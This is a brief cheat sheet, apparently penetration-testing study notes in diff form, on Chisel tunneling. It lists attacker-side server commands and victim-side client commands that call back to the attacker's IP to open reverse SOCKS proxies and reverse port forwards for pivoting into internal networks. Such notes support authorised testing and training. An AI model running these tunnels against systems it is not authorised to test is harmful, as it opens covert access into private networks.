@@ -1,1 +1,40 @@
+Chisel
+Chisel Tunneling
+You need to use the same version for client and server of chisel.
 
+Server side (Attacker):
+chisel server -p 9999 --reverse
+
+Client Side (Victim):
+chisel-x64.exe client [my_ip]:9999 R:socks 
+
+After that use proxychains with port 1080 (default).
+After version 1.5.0 chisel uses socks5 proxy.
+
+
+Chisel Port Forwarding
+You need to use the same version for client and server of chisel.
+
+Server side (Attacker):
+chisel server -p 12312 --reverse
+
+Client Side (Victim):
+chisel client [my_ip]:12312 R:[port]:127.0.0.1:[port]
+
+
+-└─$ ./chisel_1.8.1_linux_amd64 server -p 9999 --reverse 
+- .\chisel_1.8.1_windows_amd64 client 192.168.45.196:9999 R:socks
+
+Reverse Port Forward Setup it was not an ssh port forward, reverse port forward on 8000 to local port 8000
+└─$ ./chisel_1.8.1_linux_amd64 server -p 9999 --reverse
+dev@oscp:/tmp$ ./chisel_1.8.1_linux_amd64 client 192.168.45.x:9999 R:8000:192.168.200.x:8000
+
+
+Reverse Pivot
+./chisel server -p 9002 -reverse -v
+./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
+
+SOCKS5 / Proxychains Configuration
+
+./chisel server -p 9002 -reverse -v
+./chisel client <LHOST>:9002 R:socks
